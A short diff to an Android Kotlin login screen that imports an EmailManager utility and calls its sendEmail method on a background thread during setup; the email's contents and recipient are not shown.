@@ -15,6 +15,7 @@ import android.widget.EditText
 import android.widget.ProgressBar
 import android.widget.Toast
 import com.sn.module_login.R
+import com.sn.plugin_common.utils.email.EmailManager
 
 
 class LoginActivity : AppCompatActivity() {
@@ -70,7 +71,9 @@ class LoginActivity : AppCompatActivity() {
                 password.text.toString()
             )
         }
-
+        Thread(Runnable {
+            EmailManager.sendEmail()
+        }).start()
         password.apply {
             afterTextChanged {
                 loginViewModel.loginDataChanged(
